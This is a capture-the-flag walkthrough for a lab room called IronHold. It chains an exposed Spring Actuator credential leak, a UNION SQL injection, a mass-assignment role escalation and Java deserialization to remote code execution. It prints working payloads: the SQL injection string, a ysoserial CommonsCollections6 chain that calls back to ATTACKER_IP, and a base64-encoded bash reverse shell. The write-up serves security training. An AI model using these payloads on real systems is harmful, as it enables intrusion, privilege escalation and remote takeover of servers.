# [IronHold](https://tryhackme.com/room/ironhold)

## The source leaked. Read it like an attacker, chain the flaws, and shell the door-control server.

# Source Code

IronHold is retiring its inmate-management platform. Somewhere in the handover, a developer pushed the complete repository to a public mirror and then left the company. Facility security wants a straight answer before the system goes dark for good: if that repository is out there, how far could someone actually get?

We start with nothing but what leaked: the full, unredacted source, and a live copy of the application still running on the network. No credentials, no map, no walkthrough. The code tells us what the developers got wrong; the running instance tells us if we're right.

Get all four and Ironhold's last system goes down the same way it went up: on its own mistakes.
Download the source archive attached to this task and start reading. The lab machine is reachable at http://TARGET_IP:8080.

# Challenge

### What is the flag on the officer dashboard once you're inside the system?

**Flag 1 - Officer Dashboard (Exposed Spring Boot Actuator)**

**Root cause (CWE-215, Information Exposure):** `application.properties` sets `management.endpoints.web.exposure.include=*`, so every Actuator endpoint including `/actuator/env`, which dumps the full environment and property sources is reachable with no authentication.

1. Confirm the finding from the source against the running instance:

```bash
curl -s http://TARGET_IP:8080/actuator/env | jq
```

**Results:**

```json
"KIOSK_PW": {
  "value": "Sh1ftK10sk#2091",
  "origin": "System Environment Property \"KIOSK_PW\""
},
"app.kiosk.pw": {
  "value": "Sh1ftK10sk#2091",
  "origin": "class path resource [application.properties] from app.jar - 16:14"
},
```

2. The property name and the source's login controller both point to a built-in `kiosk` service account. Visit `http://TARGET_IP:8080/dashboard`. The officer dashboard flag is displayed once you're authenticated as `kiosk`. Credentials: `kiosk:Sh1ftK10sk#2091`

[SCREEN01]

---

### What is the flag in the staff record that no page on the site will show you?

**Flag 2 - The Staff Record No Page Will Show You (SQL Injection)**

**Root cause (CWE-89, SQL Injection):** the inmate search feature builds its query by concatenating the raw search term into a `SELECT` rather than using a parameterized/prepared statement. That means anything the UNION operator can smuggle through is fair game. Including tables the UI never links to, like a `case_files` table holding internal staff records.

1. Work out the shape of the vulnerable query. Since we have the source, this is fast. Find the query text in the repository/DAO class and note the column count and order. If you only had the black box, you'd get there with `ORDER BY N--` until it errors, then match types column-by-column with `UNION SELECT NULL,NULL,NULL--`.

2. With the column shape known, pivot the query to pull rows out of a table the application never intentionally exposes: `'UNION SELECT id, summary, case_number FROM case_files--`

[SCREEN02]

---

### What is the flag on the warden's door-control panel?

**Flag 3 - The Warden's Door-Control Panel (Mass Assignment / Broken Access Control)**

**Root cause (CWE-915, Mass Assignment):** the profile-update endpoint binds incoming form fields directly onto the `User` JPA entity. including a `role` field with no allow-list of which fields a client is permitted to set. A regular authenticated user can therefore write privileged fields on their own account that the UI never exposes an input for.

1. Using the valid `kiosk` session from Stage 1, submit a profile update that also sets role:

```bash
curl -s -X POST "http://TARGET_IP:8080/profile/update" \
  -H "Cookie: JSESSIONID=6E90E8E8B8310D66BAA5882ACF4F5490" \
  --data-urlencode "fullName=Shift Kiosk Account" \
  --data-urlencode "email=kiosk@ironhold.example" \
  --data-urlencode "role=WARDEN"
```

2. The server persists the extra field with no server-side check that `role` should be immutable by the user themselves. The session is now privileged as `WARDEN`. Visit the panel that role unlocks: `http://TARGET_IP:8080/admin/control`

[SCREEN03]

---

### What is the flag waiting on the facility server once you're through the gate?

**Flag 4 - Through the Gate: RCE on the Facility Server (Insecure Deserialization)**

**Root cause (CWE-502, Deserialization of Untrusted Data):** an admin-only import endpoint reads the raw POST body and calls `ObjectInputStream.readObject()` on it directly, with no type filtering. The source's `pom.xml` pulls in `commons-collections` at a version with known gadget chains, so anything Java can deserialize on that classpath, an attacker can turn into code execution.

1. Get the tooling

```bash
curl -sL -o ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

2. Stand up a listener to catch the callback

```bash
nc -lvnp 4444
```

3. Build a low-impact proof-of-concept payload first

Before going straight for a shell, confirm the gadget chain actually fires by having the target make an outbound HTTP request back to you. That way a failure just means "no callback," not "no shell and no idea why."

```bash
java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections6 "curl http://ATTACKER_IP:4444/pwned" > payload.bin
base64 -w0 payload.bin > payload.b64
curl -s -X POST "http://TARGET_IP:8080/admin/import" \
  -H "Cookie: JSESSIONID=6E90E8E8B8310D66BAA5882ACF4F5490" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.b64
```

4. Confirm the callback

```
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 59084
GET /pwned HTTP/1.1
Host: ATTACKER_IP:4444
User-Agent: curl/7.81.0
Accept: */*
```

That single GET request is proof the gadget chain executed on the server. Note that this connection closes as soon as curl on the target finishes. Restart the listener before the next step.

5. Escalate the PoC to an interactive shell

The reverse-shell one-liner has to survive being passed as a single quoted argument to `ysoserial`, so wrap it in `bash -c `and pre-encode it as base64:

```bash
java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections6 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" \
  > shell.bin
base64 -w0 shell.bin > shell.b64
curl -s -X POST "http://TARGET_IP:8080/admin/import" \
  -H "Cookie: JSESSIONID=6E90E8E8B8310D66BAA5882ACF4F5490" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @shell.b64
```

6. Catch the shell and find the flag

```bash
find / -iname "*flag*" 2>/dev/null
```

**Results:**

```
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/opt/ironhold/flag.txt
```

```bash
cat /opt/ironhold/flag.txt
```

[SCREEN04]
